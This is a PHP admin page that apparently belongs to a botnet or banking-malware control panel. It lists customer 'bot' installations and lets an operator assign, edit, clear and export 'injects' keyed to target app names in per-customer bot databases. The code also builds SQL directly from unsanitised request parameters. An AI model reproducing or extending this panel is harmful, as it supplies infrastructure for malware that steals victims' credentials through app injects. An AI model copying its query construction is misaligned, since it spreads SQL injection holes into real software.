<?php
include("lib.php");
include("config.php");

$link = mysql_connect('localhost', $_DB['user'], $_DB['password']);
mysql_query('use general', $link);
$res = mysql_query('select id, title, notes from groups', $link);

$groups = array();
while($data = mysql_fetch_assoc($res))
	$groups[$data['id']] = $data;

$clients_sorted = array();
foreach(glob($clients_path) as $client)
{
	if(endsWith($client, "/trap") || endsWith($client, "/blank"))
		continue; 
		
	//~ $data = file_get_contents("{$client}/bot/config_ert456.php");
	$config_file = glob("{$client}/bot/config_*.php")[0];
	$data = file_get_contents($config_file);
	
	preg_match('#UID\', ([0-9]+)#', $data, $res);
	$clients_sorted[$res[1]] = $client;
}

ksort($clients_sorted);
$clients_sorted = array_reverse($clients_sorted);
$clients = array();
$clients_names = array();
$clients_folders = array();
foreach($clients_sorted as $client)
{
	$parts = explode('/', $client);
	$cl_name = array_pop($parts);

	if(!is_dir($client) or $cl_name == 'blank')
		continue;
		
	# client: ../../clients/vanessablue
	$data = file_get_contents("{$client}/bot/config_ert456.php");
	preg_match('#UID\', ([0-9]+)#', $data, $res);
	$id = $res[1];
	
	$clients[$id] = $cl_name;
	$clients_folders[$id] = $cl_name;
	
	preg_match('#CLIENT\', \'([^\']+)#', $data, $res);
	$clients_names[$id] = $res[1];
}

$res = mysql_query('select id, group_id, app, folder from injects');

$injects = array();
while($data = mysql_fetch_assoc($res))
{
	if(!array_key_exists($data['group_id'], $injects))
		$injects[$data['group_id']] = array();
		
	$injects[$data['group_id']][] = $data;
}

//~ foreach($injects as $group=>$injs)
//~ {
	//~ echo "<h3>{$groups[$group]['title']}<button style='font-size: 14px; margin-left: 10px'>&raquo;</button></h3>";
	//~ foreach($injs as $inj)
	//~ {
		//~ echo "{$inj['folder']} <button style='font-size: 14px; margin-left: 10px'>&raquo;</button><br />";
		//~ 
	//~ }
	//~ echo "<br />";
//~ }

$action = (isset($_GET['subaction']))? $_GET['subaction'] : '';

if($action == ''):
?>

<div class="container">
<!--
	<div class='row'>&nbsp;</div>
	<div class='row'>
		<div class='col-md-12'>
			<a href='?action=injects&subaction=list'><button class='button green'>List all injects</button></a>
		</div>
	</div>
-->
	<div class='row'>&nbsp;</div>
	
	<?php foreach($clients as $id=>$client): ?>
	<?php
	$folder = $clients_folders[$id];
	$user_groups = '';
	$sql = "select title from {$DB_GENERAL}.groups where id in(
	select group_id from {$DB_GENERAL}.injects where id in (
	select inject_id from bot_{$folder}.injects
	) group by group_id) group by title;";
	
	$res = mysql_query($sql);
	while($data = mysql_fetch_assoc($res))
		$user_groups .= $data['title'].", ";
		
	if($user_groups)
		$user_groups = substr($user_groups, 0, strlen($user_groups)-2);
		
	?>
	<div class="box grid_6">
	<div class="box-head">
		<h2>
			<?php echo "#{$id} {$clients_names[$id]} <small style='color: #666'>{$client}</small>"; ?>
			<span style='float: right; font-weight: normal'><?php echo $user_groups; ?></span>
		</h2>
		
	</div>
		<div class="box-content">
	<a href='?action=injects&subaction=edit&client=<?php echo $id; ?>&folder=<?php echo $clients_folders[$id]; ?>'><button class='button blue'>Edit</button></a>
			<a href='?action=injects&subaction=get_apps&client=<?php echo $id; ?>&folder=<?php echo $clients_folders[$id]; ?>'><button class='button yellow'>Get apps</button></a>
			<a href='?action=injects&subaction=clear&client=<?php echo $id; ?>&folder=<?php echo $clients_folders[$id]; ?>' onclick='return confirm("Sure?")'><button class='button red'>Clear</button></a>
		</div>
	</div>
	<div class="clear"></div>
	
	
<!--
	<div class='row'>
		<div class='col-md-1'>&nbsp;</div>
		<div class='col-md-2'><?php echo "#{$id} {$clients_names[$id]}<br /><small style='color: #666'>{$client}</small>"; ?></div>
		<div class='col-md-5'>
			<a href='?action=injects&subaction=edit&client=<?php echo $id; ?>'><button class='button btn-primary'>Edit</button></a>
			<a href='?action=injects&subaction=get_apps&client=<?php echo $id; ?>'><button class='button btn-info'>Get apps</button></a>
			<a href='?action=injects&subaction=clear&client=<?php echo $id; ?>' onclick='return confirm("Sure?")'><button class='button btn-danger'>Clear</button></a>
		</div>
		<div class='col-md-4'>&nbsp;<?php echo $user_groups; ?></div>
	</div><br />
-->
	<?php endforeach; ?>
</div>

<?php elseif($action == 'add'): ?>
<form method='post' action='?action=injects&subaction=add&client=<?php echo $_GET['client']; ?>'>
<?php 
$client_id = (int) $_GET['client'];
$folder = $_GET['folder'];

if($_POST)
{
	$res = mysql_query("select inject_id from bot_{$folder}.injects") or die(mysql_error());
	$ids_avail = array();
	while($data = mysql_fetch_assoc($res))
	{
		$ids_avail[] = $data['inject_id'];
	}
	
	$ids_to_add = $_POST['chks'];
	
	$new = array();
	foreach($ids_to_add as $id)
		if(!in_array($id, $ids_avail))
			$new[] = $id;
	
	$ids_to_add = $new;
	
	if(!$ids_to_add)
	{
		echo "<b>nothing to add; already added</b><br />";
	}else{
		$sql = "insert into bot_{$folder}.injects(inject_id) values ";
		foreach($ids_to_add as $id)
		{
			$sql .= "({$id}),";
		}
		$sql = substr($sql, 0, strlen($sql)-1);
		//~ echo $sql;
		$res = mysql_query($sql) or die(mysql_error());
		$sz = sizeof($_POST['chks']);
		echo "<p style='color: green; font-weight: bold; text-align: center'>{$sz} rows inserted success</p>";
	}
}
?>

<div class="container">
	<div class='row'>
		<div class='col-md-12'><h1>Add injects to client <b><?php echo $clients[$client_id]; ?></b></h1></div>
	</div>
	<?php foreach($injects as $group=>$injs): ?>
	Group <b><?php echo $groups[$group]['title'] ." ". $groups[$group]['notes']; ?></b>&nbsp;&nbsp;&nbsp;<a href='javascript:selectGroup("chk_<?php echo $group; ?>_");undefined'>select all</a><br />
	
	<ul>
	<?php foreach($injs as $inj): ?>
		<li><input type='checkbox' name='chks[]' value='<?php echo $inj['id']; ?>' id='chk_<?php echo $group."_".$inj['id']; ?>' /><label for='chk_<?php echo $group."_".$inj['id']; ?>'><?php echo "#".$inj['id']." ".$inj['app']; ?></label></li>
	<?php endforeach; ?>
	</ul>
	
	<?php endforeach; ?>
</div>

<script>
function selectGroup(id)
{
	// id chk_1_
	// id='chk_1_1'
	var elems = document.querySelectorAll('input[id^="'+id+'"]');
	for (var i = 0; i < elems.length; i++) {
		elems[i].checked = !(elems[i].checked)
	}
}
</script>

<div class="container">
	<div class='row'>
		<input type='submit' class='button btn-primary' value='Add' />
	</div>
</div>

<div class="container">
	<div class='row'>
		<a href='index.php?action=customers'><button type='button' class='button blue'>Back</button></a>
	</div>
</div>
</form>

<?php elseif($action == 'edit'): // end Add injects ?> 

<form method='post' action='?action=injects&subaction=edit&client=<?php echo $_GET['client']; ?>&folder=<?php echo $_GET['folder']; ?>'>

<?php 
$client_id = (int) $_GET['client'];
$folder = $_GET['folder'];

if($_POST)
{
	$res = mysql_query("delete from bot_{$folder}.injects") or die(mysql_error());
	
	$ids_to_add = $_POST['chks'];
	
	if(!$ids_to_add)
	{
		echo html_msg("Nothing to save", "error");
	}else{
		$sql = "insert into bot_{$folder}.injects(inject_id) values ";
		foreach($ids_to_add as $id)
		{
			$sql .= "({$id}),";
		}
		$sql = substr($sql, 0, strlen($sql)-1);
		//~ echo $sql;
		$res = mysql_query($sql) or die(mysql_error());
		$sz = sizeof($_POST['chks']);
		echo html_msg("{$sz} rows inserted success");
	}
	
	$folder = $_POST['client_folder'];
	$sql = "update bot_{$folder}.config set value = value + 1 where name = 'data_version';";
	mysql_query($sql) or die(mysql_error());
}

$sql = "select inject_id from bot_{$folder}.injects";
$res = mysql_query($sql) or die(mysql_error());
$clients_injs = array();

while($data = mysql_fetch_assoc($res))
	$clients_injs[] = $data['inject_id'];

?>

<div class="box grid_6">
<div class="box-head">
	<input type='hidden' name='client_folder' value='<?php echo $_GET['folder']; ?>' />
	<h2>
		Edit client <b><?php echo $clients[$client_id]; ?></b> injects
	</h2>
	
</div>
	<div class="box-content">
		<?php foreach($injects as $group=>$injs): ?>
		<div class="box-head" style='margin-top: 20px'>Group <b><?php echo $groups[$group]['title'] ." ". $groups[$group]['notes']; ?></b>&nbsp;&nbsp;&nbsp;<a href='javascript:selectGroup("chk_<?php echo $group; ?>_");undefined'>select all</a></div>
		
		<ol>
		<?php foreach($injs as $inj): ?>
			<li>
				<input type='checkbox' name='chks[]' <?php echo (in_array($inj['id'], $clients_injs))? 'checked' : ''; ?> value='<?php echo $inj['id']; ?>' id='chk_<?php echo $group."_".$inj['id']; ?>' />
				<label for='chk_<?php echo $group."_".$inj['id']; ?>'><?php echo "#".$inj['id']." ".$inj['app']; ?></label>
			</li>
			
		<?php endforeach; ?>
		</ol>
		
		<?php endforeach; ?>
	</div>
</div>

<div class="box grid_6">
	<div class='content'>
		<a href='index.php?action=customers'><button type='button' class='button blue'>Back</button></a>
		<input type='submit' class='button green' value='Save' />
		
	</div>
</div>

<div class="clear"></div>


<script>
function selectGroup(id)
{
	var elems = document.querySelectorAll('input[id^="'+id+'"]');
	for (var i = 0; i < elems.length; i++) {
		elems[i].checked = !(elems[i].checked)
	}
}
</script>
</form>

<?php elseif($action == 'clear'): // end Edit injects ?> 
<?php
$client_id = (int) $_GET['client'];
$folder = $_GET['folder'];
$res = mysql_query("delete from bot_{$folder}.injects") or die(mysql_error());
echo html_msg("Client injects has been deleted success");
?>
<div class="container">
	<div class='row'>
		<a href='index.php?action=customers'><button type='button' class='button blue'>Back</button></a>
	</div>
</div>


<?php elseif($action == 'get_apps'): // end Clear injects ?> 
<?php
$client_id = (int) $_GET['client'];
$folder = $_GET['folder'];

if($_POST)
{
	$res = mysql_query("delete from bot_{$folder}.injects") or die(mysql_error());
	
	$ids_to_add = $_POST['chks'];
	
	if(!$ids_to_add)
	{
		echo html_msg("Nothing to save", "error");
	}else{
		$sql = "insert into bot_{$folder}.injects(inject_id) values ";
		foreach($ids_to_add as $id)
		{
			$sql .= "({$id}),";
		}
		$sql = substr($sql, 0, strlen($sql)-1);
		//~ echo $sql;
		$res = mysql_query($sql) or die(mysql_error());
		$sz = sizeof($_POST['chks']);
		echo html_msg("{$sz} rows inserted success");
	}
	
	$folder = $_POST['client_folder'];
	$sql = "update bot_{$folder}.config set value = value + 1 where name = 'data_version';";
	mysql_query($sql) or die(mysql_error());
}


$res = mysql_query("select app, id from injects where id in(select inject_id from bot_{$folder}.injects) ") or die(mysql_error());
//~ echo "<p style='color: green; font-weight: bold; text-align: center'>Client injects has been deleted success</p>";

$out = '';
while($data = mysql_fetch_assoc($res))
{
	$out .= "{$data['app']}:{$data['id']}\n";
}	

?>
<div class="container">
	<div class='row'>
		<a href='index.php?action=customers'><button type='button' class='button blue'>Back</button></a>
	</div>
</div>
<div class="container" style='margin-top: 10px'>
	<h2>
		Client <b><?php echo $clients[$client_id]; ?></b> injects
	</h2>
	<div class='row'>
		<div class='col-md-2'>&nbsp;</div>
		<div class='col-md-5'><textarea style='width: 100%; height: 400px;' onclick='this.select()'><?php echo $out; ?></textarea></div>
		<div class='col-md-5'>&nbsp;</div>
	</div>
</div>
<?php endif; ?>

<script>
function on_load()
{

}
</script>
